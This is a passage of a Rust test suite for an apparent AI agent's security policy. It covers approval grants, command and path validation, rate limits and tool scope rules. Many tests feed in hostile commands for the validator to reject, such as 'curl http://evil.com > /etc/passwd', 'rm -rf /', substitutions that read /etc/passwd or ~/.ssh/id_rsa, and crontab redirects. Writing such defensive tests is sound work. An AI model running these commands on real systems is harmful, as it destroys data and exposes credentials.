            sign_grant(keyring, &mut g).expect("test: sign");
            let grant = ApprovalGrant::from_verified_v2("file_write", "test", g)
                .with_caller_principal_id(Some("telegram:alice".to_string()));
            let (tmp, policy) = audited_policy();
            let gate = SideEffectGate::new(&policy);
            let _ = gate
                .authorize_resource_operation("file_write", op, ResourceRiskLevel::Medium, Some(&grant))
                .unwrap_err();
            assert!(last_deny_reason(tmp.path()).contains("validity window"));
        }
        // (5) revoked
        {
            let mut g = ApprovalGrantV2::issue_one_shot(
                keyring,
                subject.clone(),
                IssuerAuthority::HumanReview,
                op,
                RiskLevel::Medium,
            )
            .expect("test: issue");
            g.revoke("operator", Utc::now());
            sign_grant(keyring, &mut g).expect("test: sign");
            let grant = ApprovalGrant::from_verified_v2("file_write", "test", g)
                .with_caller_principal_id(Some("telegram:alice".to_string()));
            let (tmp, policy) = audited_policy();
            let gate = SideEffectGate::new(&policy);
            let _ = gate
                .authorize_resource_operation("file_write", op, ResourceRiskLevel::Medium, Some(&grant))
                .unwrap_err();
            assert!(last_deny_reason(tmp.path()).contains("revoked"));
        }
        // (6) single-use exhausted
        {
            let mut g =
                ApprovalGrantV2::issue_one_shot(keyring, subject, IssuerAuthority::HumanReview, op, RiskLevel::Medium)
                    .expect("test: issue");
            g.uses_consumed = g.max_uses;
            sign_grant(keyring, &mut g).expect("test: sign");
            let grant = ApprovalGrant::from_verified_v2("file_write", "test", g)
                .with_caller_principal_id(Some("telegram:alice".to_string()));
            let (tmp, policy) = audited_policy();
            let gate = SideEffectGate::new(&policy);
            let _ = gate
                .authorize_resource_operation("file_write", op, ResourceRiskLevel::Medium, Some(&grant))
                .unwrap_err();
            assert!(last_deny_reason(tmp.path()).contains("no remaining uses"));
        }
    }

    #[test]
    fn gate_decision_unaffected_when_audit_write_fails() {
        // Point the workspace at a file (not a dir) so audit.log can never be
        // created; the gate decision must still hold both ways.
        let tmp = tempfile::TempDir::new().expect("test: temp");
        let bogus = tmp.path().join("not_a_dir");
        std::fs::write(&bogus, b"x").expect("test: write file");

        let deny_policy = SecurityPolicy {
            autonomy: AutonomyLevel::Supervised,
            workspace_dir: bogus.clone(),
            ..SecurityPolicy::default()
        };
        let gate = SideEffectGate::new(&deny_policy);
        assert!(
            gate.authorize_command_execution("shell", "touch f.txt", None).is_err(),
            "deny decision must survive audit write failure"
        );

        let allow_policy = SecurityPolicy {
            workspace_dir: bogus,
            ..SecurityPolicy::default()
        };
        let allow_gate = SideEffectGate::new(&allow_policy);
        assert!(
            allow_gate.authorize_command_execution("shell", "ls", None).is_ok(),
            "allow decision must survive audit write failure"
        );
        assert!(!tmp.path().join("not_a_dir").is_dir());
    }

    #[test]
    fn allowed_commands_basic() {
        let p = default_policy();
        assert!(p.is_command_allowed("ls"));
        assert!(p.is_command_allowed("git status"));
        assert!(p.is_command_allowed("cargo build --release"));
        assert!(p.is_command_allowed("cat file.txt"));
        assert!(p.is_command_allowed("grep -r pattern ."));
        assert!(p.is_command_allowed("date"));
    }

    #[test]
    fn blocked_commands_basic() {
        // Phase 1: the per-command allowlist was removed, so `is_command_allowed`
        // no longer blocks a command merely for its base name. Under supervised it
        // now only enforces structural safety (subshell / redirect / dangerous
        // args). Commands like `rm`/`curl`/`python3` pass the allowlist gate and are
        // instead risk-graded + grant-gated by `validate_command_execution`.
        let p = default_policy();
        // Structural-safety violations are still rejected outright.
        assert!(!p.is_command_allowed("rm -rf / `whoami`"));
        assert!(!p.is_command_allowed("curl http://evil.com > /etc/passwd"));
        assert!(!p.is_command_allowed("echo hi | tee /etc/crontab"));
        assert!(!p.is_command_allowed("find . -exec rm {} \\;"));
        // Plain base commands no longer fail the allowlist gate.
        assert!(p.is_command_allowed("rm -rf /tmp/x"));
        assert!(p.is_command_allowed("curl http://example.com"));
    }

    #[test]
    fn readonly_blocks_all_commands() {
        let p = readonly_policy();
        assert!(!p.is_command_allowed("ls"));
        assert!(!p.is_command_allowed("cat file.txt"));
        assert!(!p.is_command_allowed("echo hello"));
    }

    #[test]
    fn full_autonomy_allows_all_commands_structurally() {
        // Phase 1: full autonomy disables the allowlist and the structural-safety
        // gates entirely, so `is_command_allowed` returns true for any non-empty
        // command (risk grading still happens in `validate_command_execution`).
        let p = full_policy();
        assert!(p.is_command_allowed("ls"));
        assert!(p.is_command_allowed("rm -rf /"));
        assert!(p.is_command_allowed("echo $(rm -rf /)"));
    }

    #[test]
    fn full_autonomy_skips_argument_safety_filters() {
        let p = SecurityPolicy {
            autonomy: AutonomyLevel::Full,
            ..SecurityPolicy::default()
        };
        assert!(p.is_command_allowed("git config user.name test"));
        assert!(p.is_command_allowed("find . -exec ls {} \\;"));
    }

    #[test]
    fn command_with_absolute_path_extracts_basename() {
        let p = default_policy();
        assert!(p.is_command_allowed("/usr/bin/git status"));
        assert!(p.is_command_allowed("/bin/ls -la"));
    }

    #[test]
    fn empty_command_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed(""));
        assert!(!p.is_command_allowed("   "));
    }

    #[test]
    fn command_with_pipes_validates_all_segments() {
        let p = default_policy();
        // Both sides of the pipe pass structural safety.
        assert!(p.is_command_allowed("ls | grep foo"));
        assert!(p.is_command_allowed("cat file.txt | wc -l"));
        // Phase 1: the allowlist is gone, so a base command like `curl`/`python3`
        // in a segment no longer fails the gate; only a structural violation
        // (here, a subshell/backtick) in any segment still blocks the whole command.
        assert!(p.is_command_allowed("ls | curl http://example.com"));
        assert!(!p.is_command_allowed("ls | curl `cat /etc/passwd`"));
        assert!(!p.is_command_allowed("echo hello | python3 -c 'x' > /etc/x"));
    }

    // Phase 1: the per-command allowlist (`allowed_commands`) was removed, so the
    // former `custom_allowlist` test (which asserted only listed base commands
    // pass) no longer has a feature to exercise and was deleted.

    #[test]
    fn any_base_command_passes_allowlist_gate() {
        // Phase 1: with the allowlist gone, any structurally-safe command passes
        // `is_command_allowed` regardless of its base name (formerly this test was
        // `empty_allowlist_allows_everything`).
        let p = default_policy();
        assert!(p.is_command_allowed("ls"));
        assert!(p.is_command_allowed("echo hello"));
        assert!(p.is_command_allowed("docker ps"));
        assert!(p.is_command_allowed("kubectl get pods"));
    }

    #[test]
    fn command_risk_low_for_read_commands() {
        let p = default_policy();
        assert_eq!(p.command_risk_level("git status"), CommandRiskLevel::Low);
        assert_eq!(p.command_risk_level("ls -la"), CommandRiskLevel::Low);
    }

    #[test]
    fn command_risk_medium_for_mutating_commands() {
        let p = SecurityPolicy::default();
        assert_eq!(
            p.command_risk_level("git reset --hard HEAD~1"),
            CommandRiskLevel::Medium
        );
        assert_eq!(p.command_risk_level("touch file.txt"), CommandRiskLevel::Medium);
    }

    #[test]
    fn command_risk_high_for_dangerous_commands() {
        let p = SecurityPolicy::default();
        assert_eq!(p.command_risk_level("rm -rf /tmp/test"), CommandRiskLevel::High);
    }

    #[test]
    fn validate_command_requires_approval_for_medium_risk() {
        let p = SecurityPolicy {
            autonomy: AutonomyLevel::Supervised,
            ..SecurityPolicy::default()
        };

        let denied = p.validate_command_execution("touch test.txt", false);
        assert!(denied.is_err());
        // d08 message wording: medium-risk denial without a runtime grant.
        assert!(denied.unwrap_err().contains("runtime approval grant"));

        let allowed = p.validate_command_execution("touch test.txt", true);
        assert_eq!(allowed.unwrap(), CommandRiskLevel::Medium);
    }

    #[test]
    fn validate_command_high_risk_requires_grant_under_supervised() {
        // Phase 1: `block_high_risk_commands` was removed. Under supervised a
        // high-risk command is gated like any medium/high op — denied without a
        // runtime grant, allowed (graded High) with one.
        let p = SecurityPolicy {
            autonomy: AutonomyLevel::Supervised,
            ..SecurityPolicy::default()
        };

        let denied = p.validate_command_execution("rm -rf tmp/test", false);
        assert!(denied.is_err());
        assert!(denied.unwrap_err().contains("runtime approval grant"));

        let allowed = p.validate_command_execution("rm -rf tmp/test", true);
        assert_eq!(allowed.unwrap(), CommandRiskLevel::High);
    }

    #[test]
    fn validate_command_rejects_forbidden_path_for_supervised_and_full() {
        for autonomy in [AutonomyLevel::Supervised, AutonomyLevel::Full] {
            let policy = SecurityPolicy {
                autonomy,
                ..SecurityPolicy::default()
            };
            for command in ["cat /etc/passwd", "cat </etc/passwd", "cat</etc/passwd"] {
                let error = policy
                    .validate_command_execution(command, true)
                    .expect_err("forbidden path must be rejected");
                assert_eq!(error, "forbidden path argument: /etc/passwd");
            }
            assert!(
                policy
                    .validate_command_execution("echo 'literal </etc/passwd in documentation'", true)
                    .is_ok(),
                "quoted redirection-like prose must remain literal"
            );
        }
    }

    #[test]
    fn validate_command_rejects_dynamic_shell_paths_but_preserves_single_quote_literals() {
        for autonomy in [AutonomyLevel::Supervised, AutonomyLevel::Full] {
            let policy = SecurityPolicy {
                autonomy,
                ..SecurityPolicy::default()
            };
            for (command, expected_error) in [
                (
                    r#"cat "$HOME/.ssh/id_rsa""#,
                    "forbidden dynamic path argument: $HOME/.ssh/id_rsa",
                ),
                ("X=/etc/passwd; cat <$X", "forbidden dynamic path argument: $X"),
                ("cat $FILE", "forbidden dynamic path argument: $FILE"),
                (
                    "FILE=/etc/passwd; command cat $FILE",
                    "forbidden dynamic path argument: $FILE",
                ),
                (
                    "FILE=/etc/passwd; eval 'cat $FILE'",
                    "forbidden dynamic path argument: $FILE",
                ),
                (
                    r#"FILE=/etc/passwd sh -c 'cat "$FILE"'"#,
                    "forbidden dynamic path argument: $FILE",
                ),
                (
                    r#"python -c 'open("/etc/passwd").read()'"#,
                    "forbidden path argument: /etc/passwd",
                ),
            ] {
                let error = policy
                    .validate_command_execution(command, true)
                    .expect_err("dynamic shell path must fail closed");
                assert_eq!(error, expected_error);
            }
            assert!(
                policy.validate_command_execution("echo '$HOME/.ssh'", true).is_ok(),
                "single-quoted dollar expressions are literal"
            );
            for command in ["echo $HOME", "printf $KEY", "sleep $SECONDS"] {
                assert!(
                    policy.validate_command_execution(command, true).is_ok(),
                    "benign no-slash dynamic argument should remain compatible: {command}"
                );
            }
            for command in ["sh ./script.sh", "python script.py", "python ./script.py"] {
                assert!(
                    policy.validate_command_execution(command, true).is_ok(),
                    "literal relative interpreter script should remain compatible: {command}"
                );
            }
        }
    }

    #[test]
    fn validate_command_rejects_active_substitutions_but_allows_single_quoted_prose() {
        for autonomy in [AutonomyLevel::Supervised, AutonomyLevel::Full] {
            let policy = SecurityPolicy {
                autonomy,
                ..SecurityPolicy::default()
            };
            for command in [
                r#"cat `printf '\057etc\057passwd'`"#,
                r#"echo "$(cat /etc/passwd)""#,
                "cat <(printf secret)",
                "cat >(cat)",
            ] {
                assert_eq!(
                    policy
                        .validate_command_execution(command, true)
                        .expect_err("active substitution must fail closed"),
                    "forbidden active shell substitution"
                );
            }
            for command in [
                "echo '$(cat /etc/passwd)'",
                "echo 'literal `cat /etc/passwd` prose'",
                "echo 'literal <(cat /etc/passwd) prose'",
            ] {
                assert!(
                    policy.validate_command_execution(command, true).is_ok(),
                    "single-quoted substitution-like prose must remain literal: {command}"
                );
            }
        }
    }

    #[test]
    fn validate_command_folds_line_continuations_before_substitution_policy_parsing() {
        let continued = [
            "echo $\\\n(printf secret)",
            "cat <\\\n(printf secret)",
            "echo $\\\r\n(printf secret)",
            "cat <\\\r\n(printf secret)",
        ];
        let direct = ["echo $(printf secret)", "cat <(printf secret)"];
        let single_quoted = [
            "echo 'literal $\\\n(printf secret) prose'",
            "echo 'literal <\\\r\n(printf secret) prose'",
        ];

        for autonomy in [AutonomyLevel::Supervised, AutonomyLevel::Full] {
            let policy = SecurityPolicy {
                autonomy,
                ..SecurityPolicy::default()
            };
            for command in continued.into_iter().chain(direct) {
                assert_eq!(
                    policy
                        .validate_command_execution(command, true)
                        .expect_err("continued and direct substitutions must fail closed"),
                    "forbidden active shell substitution"
                );
            }
            for command in single_quoted {
                assert!(
                    policy.validate_command_execution(command, true).is_ok(),
                    "single-quoted backslash-newline prose must remain literal: {command:?}"
                );
            }
        }
    }

    #[test]
    fn fold_shell_line_continuations_honors_quotes_crlf_and_backslash_parity() {
        assert_eq!(fold_shell_line_continuations("echo $\\\n(value)"), "echo $(value)");
        assert_eq!(fold_shell_line_continuations("echo $\\\r\n(value)"), "echo $(value)");
        assert_eq!(
            fold_shell_line_continuations("echo \"$\\\n(value)\""),
            "echo \"$(value)\""
        );

        let single_quoted = "echo 'literal \\\nprose'";
        assert_eq!(fold_shell_line_continuations(single_quoted), single_quoted);

        let even_backslashes = ["echo ", r"\\", "\nnext"].concat();
        assert_eq!(fold_shell_line_continuations(&even_backslashes), even_backslashes);
        let odd_backslashes = ["echo ", r"\\\", "\nnext"].concat();
        assert_eq!(
            fold_shell_line_continuations(&odd_backslashes),
            ["echo ", r"\\", "next"].concat()
        );
    }

    #[test]
    fn structural_path_and_risk_parsers_use_the_folded_command() {
        let supervised = default_policy();
        assert!(!supervised.is_command_allowed("find . -e\\\nxec printf {} \\;"));
        assert!(!supervised.is_command_allowed("find . -exec printf {} \\;"));

        for autonomy in [AutonomyLevel::Supervised, AutonomyLevel::Full] {
            let policy = SecurityPolicy {
                autonomy,
                ..SecurityPolicy::default()
            };
            for command in ["cat /etc/pass\\\nwd", "cat /etc/passwd"] {
                assert_eq!(
                    policy
                        .validate_command_execution(command, true)
                        .expect_err("continued and direct forbidden paths must both fail closed"),
                    "forbidden path argument: /etc/passwd"
                );
            }
            assert_eq!(policy.command_risk_level("r\\\nm -rf tmp"), CommandRiskLevel::High);
            assert_eq!(policy.command_risk_level("rm -rf tmp"), CommandRiskLevel::High);
        }
    }

    #[test]
    fn validate_command_full_mode_skips_medium_risk_approval_gate() {
        let p = SecurityPolicy {
            autonomy: AutonomyLevel::Full,
            ..SecurityPolicy::default()
        };

        let result = p.validate_command_execution("touch test.txt", false);
        assert_eq!(result.unwrap(), CommandRiskLevel::Medium);
    }

    #[test]
    fn validate_command_rejects_background_chain_bypass() {
        let p = default_policy();
        let result = p.validate_command_execution("ls & python3 -c 'print(1)'", false);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("not allowed"));
    }

    // ── is_path_allowed ─────────────────────────────────────

    #[test]
    fn relative_paths_allowed() {
        let p = default_policy();
        assert!(p.is_path_allowed("file.txt"));
        assert!(p.is_path_allowed("src/main.rs"));
        assert!(p.is_path_allowed("deep/nested/dir/file.txt"));
    }

    #[test]
    fn path_traversal_blocked() {
        let p = default_policy();
        assert!(!p.is_path_allowed("../etc/passwd"));
        assert!(!p.is_path_allowed("../../root/.ssh/id_rsa"));
        assert!(!p.is_path_allowed("foo/../../../etc/shadow"));
        assert!(!p.is_path_allowed(".."));
    }

    #[test]
    fn absolute_paths_blocked_when_workspace_only() {
        let p = default_policy();
        assert!(!p.is_path_allowed("/etc/passwd"));
        assert!(!p.is_path_allowed("/root/.ssh/id_rsa"));
        assert!(!p.is_path_allowed("/tmp/file.txt"));
    }

    #[test]
    fn absolute_paths_allowed_when_not_workspace_only() {
        let p = SecurityPolicy {
            workspace_only: false,
            forbidden_paths: vec![],
            ..SecurityPolicy::default()
        };
        assert!(p.is_path_allowed("/tmp/file.txt"));
    }

    #[test]
    fn forbidden_paths_blocked() {
        let p = SecurityPolicy {
            workspace_only: false,
            ..SecurityPolicy::default()
        };
        assert!(!p.is_path_allowed("/etc/passwd"));
        assert!(!p.is_path_allowed("/root/.bashrc"));
        assert!(!p.is_path_allowed("~/.ssh/id_rsa"));
        assert!(!p.is_path_allowed("~/.gnupg/pubring.kbx"));
    }

    #[test]
    fn empty_path_allowed() {
        let p = default_policy();
        assert!(p.is_path_allowed(""));
    }

    #[test]
    fn dotfile_in_workspace_allowed() {
        let p = default_policy();
        assert!(p.is_path_allowed(".gitignore"));
        assert!(p.is_path_allowed(".env"));
    }

    // ── from_config ─────────────────────────────────────────

    #[test]
    fn from_config_maps_all_fields() {
        let autonomy_config = crate::config::AutonomyConfig {
            level: AutonomyLevel::Full,
            workspace_only: false,
            forbidden_paths: vec!["/secret".into()],
            max_actions_per_hour: 100,
            max_cost_per_day_cents: 1000,
            ..crate::config::AutonomyConfig::default()
        };
        let workspace = PathBuf::from("/tmp/test-workspace");
        let policy = SecurityPolicy::from_config(&autonomy_config, &workspace);

        // Phase 1: allowed_commands / require_approval_for_medium_risk /
        // block_high_risk_commands were removed; only the surviving fields map.
        assert_eq!(policy.autonomy, AutonomyLevel::Full);
        assert!(!policy.workspace_only);
        assert_eq!(policy.forbidden_paths, vec!["/secret"]);
        assert_eq!(policy.max_actions_per_hour, 100);
        assert_eq!(policy.max_cost_per_day_cents, 1000);
        assert_eq!(policy.workspace_dir, PathBuf::from("/tmp/test-workspace"));
    }

    // ── Default policy ──────────────────────────────────────

    #[test]
    fn default_policy_has_sane_values() {
        let p = SecurityPolicy::default();
        let autonomy = crate::config::AutonomyConfig::default();
        assert_eq!(p.autonomy, AutonomyLevel::Full);
        assert!(p.workspace_only);
        assert!(!p.forbidden_paths.is_empty());
        assert_eq!(p.workspace_only, autonomy.workspace_only);
        assert_eq!(p.forbidden_paths, autonomy.forbidden_paths);
        assert_eq!(p.max_actions_per_hour, autonomy.max_actions_per_hour);
        assert_eq!(p.max_cost_per_day_cents, autonomy.max_cost_per_day_cents);
    }

    // ── ActionTracker / rate limiting ───────────────────────

    #[test]
    fn action_tracker_starts_at_zero() {
        let tracker = ActionTracker::new();
        assert_eq!(tracker.count(), 0);
    }

    #[test]
    fn action_tracker_records_actions() {
        let tracker = ActionTracker::new();
        assert_eq!(tracker.record(), 1);
        assert_eq!(tracker.record(), 2);
        assert_eq!(tracker.record(), 3);
        assert_eq!(tracker.count(), 3);
    }

    #[test]
    fn record_action_allows_within_limit() {
        let p = SecurityPolicy {
            max_actions_per_hour: 5,
            ..SecurityPolicy::default()
        };
        for _ in 0..5 {
            assert!(p.record_action(), "should allow actions within limit");
        }
    }

    #[test]
    fn record_action_blocks_over_limit() {
        let p = SecurityPolicy {
            max_actions_per_hour: 3,
            ..SecurityPolicy::default()
        };
        assert!(p.record_action()); // 1
        assert!(p.record_action()); // 2
        assert!(p.record_action()); // 3
        assert!(!p.record_action()); // 4 — over limit
    }

    #[test]
    fn is_rate_limited_reflects_count() {
        let p = SecurityPolicy {
            max_actions_per_hour: 2,
            ..SecurityPolicy::default()
        };
        assert!(!p.is_rate_limited());
        p.record_action();
        assert!(!p.is_rate_limited());
        p.record_action();
        assert!(p.is_rate_limited());
    }

    #[test]
    fn action_tracker_clone_is_independent() {
        let tracker = ActionTracker::new();
        tracker.record();
        tracker.record();
        let cloned = tracker.clone();
        assert_eq!(cloned.count(), 2);
        tracker.record();
        assert_eq!(tracker.count(), 3);
        assert_eq!(cloned.count(), 2); // clone is independent
    }

    // ── Edge cases: command injection ────────────────────────

    #[test]
    fn semicolon_splits_into_validated_segments() {
        // Phase 1: the allowlist is gone, so a `;`-chained command is no longer
        // blocked merely because a later segment's base command is "dangerous";
        // each segment is split out and validated structurally. A plain chain is
        // now allowed, but a structurally-unsafe segment still blocks the whole.
        let p = default_policy();
        assert!(p.is_command_allowed("ls; rm -rf /tmp/x"));
        assert!(p.is_command_allowed("ls;echo done"));
        assert!(!p.is_command_allowed("ls; rm -rf `cat /etc/passwd`"));
    }

    #[test]
    fn quoted_semicolons_do_not_split_sqlite_command() {
        let p = SecurityPolicy::default();
        assert!(p.is_command_allowed(
            "sqlite3 /tmp/test.db \"CREATE TABLE t(id INT); INSERT INTO t VALUES(1); SELECT * FROM t;\""
        ));
        assert_eq!(
            p.command_risk_level(
                "sqlite3 /tmp/test.db \"CREATE TABLE t(id INT); INSERT INTO t VALUES(1); SELECT * FROM t;\""
            ),
            CommandRiskLevel::Low
        );
    }

    #[test]
    fn unquoted_semicolon_after_quoted_sql_still_splits_commands() {
        let p = default_policy();
        // The unquoted `;` after the quoted SQL still splits off a second segment;
        // Phase 1: a plain `rm` segment now passes structurally, but a segment with
        // a subshell still fails — proving the split (and structural gate) happen.
        assert!(p.is_command_allowed("sqlite3 /tmp/test.db \"SELECT 1;\"; rm -rf /tmp/x"));
        assert!(!p.is_command_allowed("sqlite3 /tmp/test.db \"SELECT 1;\"; rm -rf $(pwd)"));
    }

    #[test]
    fn command_injection_backtick_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("echo `whoami`"));
        assert!(!p.is_command_allowed("echo `rm -rf /`"));
    }

    #[test]
    fn command_injection_dollar_paren_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("echo $(cat /etc/passwd)"));
        assert!(!p.is_command_allowed("echo $(rm -rf /)"));
    }

    #[test]
    fn command_with_env_var_prefix() {
        let p = default_policy();
        // Phase 1: env assignments are stripped before the structural check, and the
        // allowlist is gone, so `FOO=bar rm ...` now passes the gate (risk grading
        // and grant requirement happen later). A structural violation still blocks.
        assert!(p.is_command_allowed("FOO=bar rm -rf /tmp/x"));
        assert!(!p.is_command_allowed("FOO=bar rm -rf $(pwd)"));
    }

    #[test]
    fn command_newline_injection_splits_segments() {
        let p = default_policy();
        // Phase 1: a newline still splits into two validated segments, but with the
        // allowlist removed a plain `rm` segment now passes; a structurally-unsafe
        // segment after the newline still blocks the whole command.
        assert!(p.is_command_allowed("ls\nrm -rf /tmp/x"));
        assert!(p.is_command_allowed("ls\necho hello"));
        assert!(!p.is_command_allowed("ls\nrm -rf `pwd`"));
    }

    #[test]
    fn command_and_chain_validates_each_segment() {
        let p = default_policy();
        // Phase 1: `&&` still splits into validated segments. With the allowlist
        // removed, a plain trailing command passes; a structurally-unsafe segment
        // (subshell / redirect) still blocks the whole chain.
        assert!(p.is_command_allowed("ls && rm -rf /tmp/x"));
        assert!(p.is_command_allowed("echo ok && curl http://example.com"));
        assert!(p.is_command_allowed("ls && echo done"));
        assert!(!p.is_command_allowed("ls && rm -rf $(pwd)"));
    }

    #[test]
    fn command_or_chain_validates_each_segment() {
        let p = default_policy();
        // Phase 1 (see `command_and_chain_validates_each_segment`).
        assert!(p.is_command_allowed("ls || rm -rf /tmp/x"));
        assert!(p.is_command_allowed("ls || echo fallback"));
        assert!(!p.is_command_allowed("ls || rm -rf `pwd`"));
    }

    #[test]
    fn command_injection_background_chain_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("ls & rm -rf /"));
        assert!(!p.is_command_allowed("ls&rm -rf /"));
        assert!(!p.is_command_allowed("echo ok & python3 -c 'print(1)'"));
    }

    #[test]
    fn command_injection_redirect_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("echo secret > /etc/crontab"));
        assert!(!p.is_command_allowed("ls >> /tmp/exfil.txt"));
    }

    #[test]
    fn quoted_ampersand_and_redirect_literals_are_not_treated_as_operators() {
        let p = default_policy();
        assert!(p.is_command_allowed("echo \"A&B\""));
        assert!(p.is_command_allowed("echo \"A>B\""));
    }

    #[test]
    fn command_argument_injection_blocked() {
        let p = default_policy();
        // find -exec is a common bypass
        assert!(!p.is_command_allowed("find . -exec rm -rf {} +"));
        assert!(!p.is_command_allowed("find / -ok cat {} \\;"));
        // git config/alias can execute commands
        assert!(!p.is_command_allowed("git config core.editor \"rm -rf /\""));
        assert!(!p.is_command_allowed("git alias.st status"));
        assert!(!p.is_command_allowed("git -c core.editor=calc.exe commit"));
        // Legitimate commands should still work
        assert!(p.is_command_allowed("find . -name '*.txt'"));
        assert!(p.is_command_allowed("git status"));
        assert!(p.is_command_allowed("git add ."));
    }

    #[test]
    fn command_injection_dollar_brace_blocked() {
        let p = default_policy();
        assert!(
            p.validate_command_execution("echo ${IFS}cat${IFS}/etc/passwd", true)
                .is_err()
        );
        let benign_dynamic = ["echo $", "{SAFE:-unset}"].concat();
        assert!(p.validate_command_execution(&benign_dynamic, true).is_ok());
    }

    #[test]
    fn command_injection_tee_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("echo secret | tee /etc/crontab"));
        assert!(!p.is_command_allowed("ls | /usr/bin/tee outfile"));
        assert!(!p.is_command_allowed("tee file.txt"));
    }

    #[test]
    fn command_injection_process_substitution_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("cat <(echo pwned)"));
        assert!(!p.is_command_allowed("ls >(cat /etc/passwd)"));
    }

    #[test]
    fn command_env_var_prefix_with_allowed_cmd() {
        let p = default_policy();
        // env assignment + command — the assignment is stripped before validation.
        assert!(p.is_command_allowed("FOO=bar ls"));
        assert!(p.is_command_allowed("LANG=C grep pattern file"));
        // Phase 1: with the allowlist gone, env-prefixed `rm` passes the gate too;
        // only a structural violation after the assignment still blocks.
        assert!(p.is_command_allowed("FOO=bar rm -rf /tmp/x"));
        assert!(!p.is_command_allowed("FOO=bar rm -rf `pwd`"));
    }

    // ── Edge cases: path traversal ──────────────────────────

    #[test]
    fn path_traversal_encoded_dots() {
        let p = default_policy();
        // Literal ".." in path — always blocked
        assert!(!p.is_path_allowed("foo/..%2f..%2fetc/passwd"));
    }

    #[test]
    fn path_traversal_double_dot_in_filename() {
        let p = default_policy();
        // ".." in a filename (not a path component) is allowed
        assert!(p.is_path_allowed("my..file.txt"));
        // But actual traversal components are still blocked
        assert!(!p.is_path_allowed("../etc/passwd"));
        assert!(!p.is_path_allowed("foo/../etc/passwd"));
    }

    #[test]
    fn path_with_null_byte_blocked() {
        let p = default_policy();
        assert!(!p.is_path_allowed("file\0.txt"));
    }

    #[test]
    fn path_symlink_style_absolute() {
        let p = default_policy();
        assert!(!p.is_path_allowed("/proc/self/root/etc/passwd"));
    }

    #[test]
    fn path_home_tilde_ssh() {
        let p = SecurityPolicy {
            workspace_only: false,
            ..SecurityPolicy::default()
        };
        assert!(!p.is_path_allowed("~/.ssh/id_rsa"));
        assert!(!p.is_path_allowed("~/.gnupg/secring.gpg"));
    }

    #[test]
    fn path_var_run_blocked() {
        let p = SecurityPolicy {
            workspace_only: false,
            ..SecurityPolicy::default()
        };
        assert!(!p.is_path_allowed("/var/run/docker.sock"));
    }

    // ── Edge cases: rate limiter boundary ────────────────────

    #[test]
    fn rate_limit_exactly_at_boundary() {
        let p = SecurityPolicy {
            max_actions_per_hour: 1,
            ..SecurityPolicy::default()
        };
        assert!(p.record_action()); // 1 — exactly at limit
        assert!(!p.record_action()); // 2 — over
        assert!(!p.record_action()); // 3 — still over
    }

    #[test]
    fn rate_limit_zero_blocks_everything() {
        let p = SecurityPolicy {
            max_actions_per_hour: 0,
            ..SecurityPolicy::default()
        };
        assert!(!p.record_action());
    }

    #[test]
    fn rate_limit_high_allows_many() {
        let p = SecurityPolicy {
            max_actions_per_hour: 10000,
            ..SecurityPolicy::default()
        };
        for _ in 0..100 {
            assert!(p.record_action());
        }
    }

    // ── Edge cases: autonomy + command combos ────────────────

    #[test]
    fn readonly_blocks_even_safe_commands() {
        let p = SecurityPolicy {
            autonomy: AutonomyLevel::ReadOnly,
            ..SecurityPolicy::default()
        };
        assert!(!p.is_command_allowed("ls"));
        assert!(!p.is_command_allowed("cat"));
        assert!(!p.can_act());
    }

    #[test]
    fn supervised_passes_structurally_safe_commands() {
        // Phase 1: under supervised the allowlist no longer gates base commands, so
        // any structurally-safe command passes `is_command_allowed` (the supervised
        // medium/high grant requirement is enforced by `validate_command_execution`).
        let p = SecurityPolicy {
            autonomy: AutonomyLevel::Supervised,
            ..SecurityPolicy::default()
        };
        assert!(p.is_command_allowed("git status"));
        assert!(p.is_command_allowed("docker ps"));
        // A structural violation is still rejected.
        assert!(!p.is_command_allowed("docker ps > /etc/x"));
    }

    #[test]
    fn full_autonomy_still_respects_forbidden_paths() {
        let p = SecurityPolicy {
            autonomy: AutonomyLevel::Full,
            workspace_only: false,
            ..SecurityPolicy::default()
        };
        assert!(!p.is_path_allowed("/etc/shadow"));
        assert!(!p.is_path_allowed("/root/.bashrc"));
    }

    // ── is_tool_allowed / scope rules ────────────────────────

    fn make_scope_policy(rules: Vec<crate::config::ScopeRule>, default_allow: bool) -> SecurityPolicy {
        SecurityPolicy {
            scope_rules: rules,
            scope_default_allow: default_allow,
            ..SecurityPolicy::default()
        }
    }

    #[test]
    fn default_allow_permits_any_tool_when_no_rules() {
        let p = make_scope_policy(vec![], true);
        assert!(p.is_tool_allowed("shell", "uuid:alice", "signal", "direct"));
        assert!(p.is_tool_allowed("file_write", "uuid:bob", "telegram", "group"));
    }

    #[test]
    fn default_deny_blocks_any_tool_when_no_rules() {
        let p = make_scope_policy(vec![], false);
        assert!(!p.is_tool_allowed("shell", "uuid:alice", "signal", "direct"));
        assert!(!p.is_tool_allowed("memory_recall", "uuid:bob", "telegram", "group"));
    }

    #[test]
    fn deny_list_blocks_specified_tool() {
        let p = make_scope_policy(
            vec![crate::config::ScopeRule {
                user: None,
                channel: Some("signal".into()),
                chat_type: Some("group".into()),
                tools_allow: vec![],
                tools_deny: vec!["shell".into()],
            }],
            true,
        );
        // shell blocked in signal groups
        assert!(!p.is_tool_allowed("shell", "uuid:alice", "signal", "group"));
        // shell still allowed in direct messages (rule doesn't match)
        assert!(p.is_tool_allowed("shell", "uuid:alice", "signal", "direct"));
        // other tools not blocked
        assert!(p.is_tool_allowed("memory_recall", "uuid:alice", "signal", "group"));
    }

    #[test]
    fn allow_list_whitelists_tools() {
        let p = make_scope_policy(
            vec![crate::config::ScopeRule {
                user: Some("uuid:untrusted".into()),
                channel: None,
                chat_type: None,
                tools_allow: vec!["memory_recall".into()],
                tools_deny: vec![],
            }],
            true,
        );
        // untrusted user can use memory_recall
        assert!(p.is_tool_allowed("memory_recall", "uuid:untrusted", "signal", "direct"));
        // untrusted user cannot use shell (not in allow list)
        assert!(!p.is_tool_allowed("shell", "uuid:untrusted", "signal", "direct"));
        // other users still use default (allow)
        assert!(p.is_tool_allowed("shell", "uuid:trusted", "signal", "direct"));
    }

    #[test]
    fn deny_takes_priority_over_allow() {
        // Both allow and deny list contain "shell" — deny wins.
        let p = make_scope_policy(
            vec![crate::config::ScopeRule {
                user: None,
                channel: None,
                chat_type: None,
